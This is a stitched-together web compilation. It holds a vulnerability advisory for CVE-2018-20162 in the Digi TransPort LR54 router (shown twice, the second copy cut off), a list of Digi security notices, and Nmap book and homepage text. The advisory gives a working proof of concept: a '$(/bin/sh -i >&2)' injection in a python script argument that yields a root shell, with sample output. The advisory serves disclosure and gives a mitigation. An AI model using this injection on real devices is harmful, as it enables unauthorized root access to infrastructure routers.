# CVE-2018-20162: Digi TransPort LR54 Restricted Shell Escape

17/02/19 â sgo

![lr54](/images/lr54.jpg)

The Digi TransPort LR54 is a high speed LTE router commonly used by industry,
infrastructure, retail and public transportation.

It supports running python scripts in a restricted sandbox, and has a custom
shell accessible over SSH which is subjected to the same restrictions. The
underlying OS is therefore inaccessible to the administrator.

Iâve found a way to break out of the sandbox and obtaining a root shell by
exploiting the way the cli handles command line arguments when executing python
scripts:

When an interactive python process receives a SIGINT (trough CTRL-C), arguments
to the script are not properly escaped when passed to the interactive CLIâs
error logging handler. This allows an attacker to execute arbitrary commands
as root.

To exploit this vulnerability, an attacker needs to have interactive CLI access
with âsuperâ privileges. A user with this access level is enabled by default on
the device.

# Vulnerable

Digi Transport LR54 (and maybe related products like WR64 and WR54)

* Firmware Version : 4.4.0.26 10/29/2018 21:14:06
* Firmware Version : 4.3.2.24 09/06/2018 00:58:34

And maybe earlier versions

# Mitigation

Users should upgrade to firmware version 4.5.1.4 or newer.

# Proof of Concept

1. Upload `sleep.py` to the LR54 using scp or sftp, containing:
   ```
   import time;time.sleep(10)

   ```
2. Execute the following command in the LR54 cli:
   ```
   python sleep.py --XXX $(/bin/sh -i >&2)

   ```
3. Immediately press `CTRL-C` after the program starts
4. You are then dropped to an interactive root shell
   ```
   /home/digi/user # uname -a
   Linux (none) 3.10.14 #1 SMP Mon Oct 29 16:18:10 CDT 2018 mips GNU/Linux
   /home/digi/user # id
   uid=0(root) gid=2000(users_rw) groups=2000(users_rw),2002(users_super)

   ```

Jun 14, 2021
###### **FragAttacks - WiFi Fregmentation and Aggregation Attacks**

At this time, Digi is still reviewing these attacks and how they impact our devices. From the nature of the attacks, we do expect that Digi devices will be impacted.

However, it is critical to note that even with these attacks, it has always been DIgi's policy and suggestions that network communication should never rely on the protections and standards of the data layers (WiFi/BlueTooth). Many of these are implemented in HW and can be difficult to change. If good network practices are used, (TLS/Certificates etc), then these vulnerabilities do not lead to any real impact. These vulnerabilites can only become impactful IF other flaws or issues are present.

It is Digi's intent to address these issues so that we preserve our defense in depth strategy to security in our products. Due to the complexity of these issues, we believe we will be able to address these by Q4 of 2021 or sooner if possible.

Dec 09, 2020
###### **AMNESIA:33 - VU#815128 - Multiple TCP/IP stacks used in Internet of Things (IoT have several vulnerabilities stemming from improper memory management.**

Jun 16, 2020
###### **RIPPLE20 - Multiple vulnerabilities in TRECK TCP/IP embedded software - VU#257161**

A number of high level vulnerabilities (CVE's) that affect the TCP/IP internal stack processing have been identified. Digi has been working with customers since February to install firmware updates to address the issue. Under specific circumstances, it may be possible that these vulnerabilities could lead to a remote code execution via a network based attack without authentication.

Jun 02, 2020
###### **Reflection attack WR11,WR21,WR31,WR41,WR44 series routers - VU#636397 - CVE-2020-10136**

A high level vulnerability (CVSS => 7.0) was discovered on the Digi WR11,WR21,WR31,WR41, and WR44 cellular routers. The attack allows IP-in-IP encapsulation to be used to route arbitrary network traffic through a vulnerable device.

Please download firmware V8.1.0.1 (or greater) for a fix for this issue. Alternatively, enabling the firewall feature on the devices WAN interface (or cellular interface) port will also mitigate this attack.

For more information on this vulnerability, please see the knowledge base article within the Digi support section

# CVE-2018-20162: Digi TransPort LR54 Restricted Shell Escape

Hash: SHA512

CVE-2018-20162: Digi TransPort LR54 Restricted Shell Escape
===========================================================

The Digi TransPort LR54 is a high speed LTE router commonly used by industry,
infrastructure, retail and public transportation.

It supports running python scripts in a restricted sandbox, and has a custom
shell accessible over SSH which is subjected to the same restrictions. The
underlying OS is inaccessible to the administrator.

I’ve found a way to break out of the sandbox and obtaining a root shell by
exploiting the way the cli handles command line arguments when executing python
scripts:

When an interactive python process receives a SIGINT (trough CTRL-C), arguments
to the script are not properly escaped when passed to the interactive CLI’s
error logging handler. This allows an attacker to execute arbitrary commands as
root.

To exploit this vulnerability, an attacker needs to have interactive CLI access
with ‘super’ privileges. A user with this access level is enabled by default on
the device.

Vulnerable
- ----------
Digi Transport LR54 (and maybe related products like WR64 and WR54)

Firmware Version : 4.4.0.26 10/29/2018 21:14:06
Firmware Version : 4.3.2.24 09/06/2018 00:58:34

And maybe earlier versions

Migitation
- ----------
Users should upgrade to firmware version 4.5.1.4 or newer.

Proof of Concept
- ----------------
1. Upload sleep.py to the LR54 using scp or sftp, containing:

    import time;time.sleep(10)

2. Execute the following command in the LR54 cli:

    python sleep.py --XXX $(/bin/sh -i >&2)

3. Immediately press CTRL-C after the program starts

4. You are then dropped to an interactive root shel

# Nmap Network Scanning

[![Cover of Nmap Network Scanning](https://nmap.org/book/cover/nns-whole-cover-326x200.jpg)](http://www.amazon.com/dp/0979958717?tag=secbks-20)

*Nmap Network Scanning* is
the official guide to the [Nmap Security Scanner](https://nmap.org/),
a free and open source utility used by millions of people for
network discovery, administration, and security auditing. From
explaining port scanning basics for novices to detailing
low-level packet crafting methods used by advanced hackers, this book suits
all levels of security and networking professionals. A 42-page reference
guide documents every Nmap feature and option, while the rest of the
book demonstrates how to apply those features to quickly solve
real-world tasks. Examples and diagrams show actual communication on
the wire.

Topics include subverting firewalls and intrusion detection systems,
optimizing Nmap performance, and automating common networking tasks
with the Nmap Scripting Engine. Hints and instructions are provided
for common uses such as taking network inventory, penetration testing,
detecting rogue wireless access points, and quashing network worm
outbreaks. Nmap runs on Windows, Linux, and Mac OS X.

Nmap's original author, Gordon “Fyodor” Lyon, wrote
this book to share everything he has learned about network scanning
during more than a decade of Nmap development. It was briefly the #1
selling computer book on Amazon
([screenshot](https://nmap.org/book/img/nns-top-seller-942x1024.png)).
The book is in English, though [several translations](#translations) are in the works.

Key facts: The ISBN is 978-0-9799587-1-7 (ISBN-10 is 0-9799587-1-7)
and suggested retail prices are $49.95 in the U.S., £34.95 in
the U.K., and €39.95 in Europe. Like most books, it costs less
online (as little as $32.97 - see [purchasing
options](#purchase)). It is 468 pages long. The official release date was
January 1, 2009, though Amazon managed to beat that by a couple weeks.

About half of the content is [available in the
free online edition](toc.html). Chapters exclusive to the print edition
include “Detecting and Subverting Firewalls and Intrusion
Detection Systems”, “Optimizing Nmap Performance”,
“Port Scanning Techniques and Algorithms”, “Host
Discovery (Ping Scanning)”, and more.
The *solution* selections which provide detailed
instructions on the best way to solve common networking tasks are also
exclusive to the printed book. The
[final table of contents](toc.pdf) and [cover art](cover/) are available.

## Updates

Several people asked whether Nmap Network Scanning
is still up to date, particularly after the release of [Nmap 5.00](https://nmap.org/5/). The good news is that virtually all of the
content remains accurate. But we have added some new features and
NSE scripts which aren't yet documented in NNS.

For a comprehensive and completely current view of Nmap, I
recommend reading Nmap Network Scanning first, then read all the
changelog entries we've produced since the book was finished. The
book is completely up-to-date with Nmap 4.76. So after (or before)
you're done reading Nmap Network Scanning, visit
the [Nmap changelog](https://nmap.org/changelog.html) and search
in the file for “Nmap 4.76”. Read each item upward from there
(scrolling backward) until you get to the top.
## Translations

We would love to make the Nmap book more accessible by working with foreign publishers who will translate and distribute it in their markets. If you are such a publisher or know a good one to suggest, please let me know. Here are the current or in-progress translations:

* [![Cover of 'Nmap - Netzwerke scannen, analysieren und absichern'](xlate/nmap-opensourcepress-de-cover-95x125.jpg)](https://www.opensourcepress.de/index.php?26&backPID=178&tt_products=270)
  [Nmap - Netzwerke scannen, analysieren und absichern](https://www.opensourcepress.de/index.php?26&backPID=178&tt_products=270) is the German translation by Open Source Press, released in June 2009 at a list price of €39.90. Translation was performed expertly by Dinu Gherman. They have contributed back their [Nmap Reference Guide German translation](/man/de/).* [![Cover of 'Exame de Redes com NMAP'](xlate/nmap-ciencia-moderna-cover-95x125.jpg)](http://www.lcm.com.br/index.php?Escolha=20&Livro=L00778)
    [Exame de Redes com NMAP](http://www.lcm.com.br/index.php?Escolha=20&Livro=L00778) is the Brazilian Portuguese translation by Editora Ciência Moderna. Translation was done by [Angico](http://www.angico.org) and release was August 26, 2009. You can [buy it directly from the publisher](http://www.lcm.com.br/index.php?Escolha=20&Livro=L00778) for R$95.20.* [![Cover of '엔맵 네트워크 스캐닝'](xlate/nmap-acornpub-ko-cover-95x125.png)](http://www.acornpub.co.kr/book/nmap)
      The official Korean translation, entitled [엔맵 네트워크 스캐닝](http://www.acornpub.co.kr/book/nmap), has been created by [Acorn Publishing Co](http://www.acornpub.co.kr/). The release date was November 16, 2009 at a list price of KRW 35,000.

## Current status

**August 26:** Many Barnes & Noble stores now stock NNS, as described in the [purchasing section](#purchase).

**August 26:** Editora Ciência Moderna released the Brazilian Portuguese translation. See [translations](#translations).

**July 31:** Held a [book signing](http://seclists.org/nmap-dev/2009/q3/0426.html) at Defcon. All copies sold out in 3 hours.

**July 17:** Added [Updates](#updates) section.

**July 16:** [Nmap 5.00](https://nmap.org/5/) released!

**June 11:** The German translation from Open Source Press is [now available](https://www.opensourcepress.de/index.php?26&backPID=178&tt_products=270). They also contributed back a [German translation of the Nmap Reference Guide.](/man/de/)

**January 30:** Today the Amazon price is back to $32.97 after several days at $37.96. I hope they keep it at this price!

**January 23:** Amazon has raised their prices, so I've added [more purchase options](#purchase), though the cheapest is still only about $4.50 less than Amazon when domestic shipping is taken into account.

**January 21:** NNS receives a [glowing review](http://netsecurity.about.com/od/14/gr/NMapBook.htm) from About.Com.

**January 19:** Translation contracts have been signed for Korean and Brazilian Portuguese editions of Nmap Network Scanning! See the new [Translations](#translations) section for details.

**January 5:** [Acorn Publishing Co.](http://www.acornpub.co.kr) will be publishing the official Korean translation of Nmap Network Scanning! Release is expected in August.

**January 4:** NNS is finally in stock at [Amazon U.K.](http://www.amazon.co.uk/dp/0979958717) and [Amazon Germany](http://www.amazon.de/dp/0979958717). Amazon Canada currently still has a [1-3 week backlog](http://www.amazon.ca/dp/0979958717).

**December 31, 2008:** NNS makes Richard Bejtlich's TaoSecurity [Top Books of 2008](http://taosecurity.blogspot.com/2008/12/best-book-bejtlich-read-in-2008.html) list.

**December 29, 2008:** A new [Information Week review](http://www.informationweek.com/blog/main/archives/2008/12/nmap_network_sc.html) is one of the best so far!

**December 19, 2008:** The book is [back in stock on Amazon](http://www.amazon.com/dp/0979958717?tag=secbks-20) after a 10 day dry spell!

**December 10, 2008:** Amazon has now indexed this book as part of
their “Search Inside” program. While Amazon intends this
as a marketing tool for prospective buyers, it can be even more useful
for folks who already own the book. While we're proud of our index,
Search Inside can help find more obscure terms or combinations of them. You can try this out by visiting
the [Amazon
NNS page](http://www.amazon.com/dp/0979958717?tag=secbks-20), scrolling down to the Search Inside box, and typing in a
term such as Trinity or Microsoft.

**December 9, 2008:** Sales were so high that Amazon ran out of stock in the US, UK, and Germany. They say it may take a week or more to ship. Amazon still offers a great price, but for those who can't wait, I've added a [purchasing options](#purchase) section. It includes vendor such as A1Books and Barnes & Noble with NNS in stock now.

**December 9, 2008:** Nmap Network Scanning sales surge further to become #1 on [Amazon's computer book best seller list](http://www.amazon.com/gp/bestsellers/books/5/ref%3Dpd_zg_hrsr_b_1_2%26tag%3Dsecbks-20)! Since we can't keep that rank forever, I took a [screenshot](img/nns-top-seller-471x512.png) ([larger version](img/nns-top-seller-942x1024.png)).

**December 8, 2008:**
An [excellent
Slashdot review](http://books.slashdot.org/books/08/12/08/1443223.shtml) causes NNS to rocket into [Amazon's top 10 computer books](http://www.amazon.com/gp/bestsellers/books/5/ref%3Dpd_zg_hrsr_b_1_2%26tag%3Dsecbks-20).

**December 6, 2008:** Amazon has [fixed the price](http://www.amazon.com/dp/0979958717?tag=secbks-20) so it is now $33.71 rather than $49.95. NNS is **in stock and shipping**!

**December 2, 2008:** The book has [an initial page on Amazon](http://www.amazon.com/dp/0979958717?tag=secbks-20). You can pre-order it now, but Amazon is showing a pre-order price of $49.95. I expect the price to be about $33 when Amazon starts shipping it within a week or two. Amazon will probably refund the difference per their "Pre-order price guarantee", but it might be safer to wait. Book seller BOOKSPLUSMORESTUFF claims to have the book "in stock" on Amazon for $53.94 including shipping. That may or may not be true.

**November 14, 2008:** The book is finished and submitted to the
printer! The official release date is January 1, 2009, though our
goal is to make it available on Amazon and other retailers by
mid-December. To be notified upon publication, join the
low-traffic [nmap-hackers
announcement mailing list](https://nmap.org/mailman/listinfo/announce).

**September 15, 2008:** The Black Hat/Defcon pre-release was a huge
success! All of the Defcon copies were snapped up as soon as the
vendor room opened, and the Black Hat copies also sold out in the
first morning of the conference. Thanks to Bill Pollock of No Starch
Press and Dave Hemsath of BreakPoint Books for handling sales. My
conference presentation video and audio have
been [posted
online](http://insecure.org/presentations/) just in time for
the [Nmap
4.75 release](http://seclists.org/nmap-hackers/2008/0004.html) which includes the new features discussed in that
presentation.

**July 25, 2008**: Defcon Pre-Release announced! We have decided to
launch the book with a limited pre-release version at Defcon 16.

**July 1, 2008**: After years of work, Nmap Network Scanning is nearing completion. You can browse the [current table of contents](toc.pdf) to see what is coming. We recently conducted a test-printing of some prepublication copies:

[![Prepublication test-print of Nmap Network Scanning](images/nns-preprint3-750w.jpg)](images/nns-preprint3-1224x1466.jpg)

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).
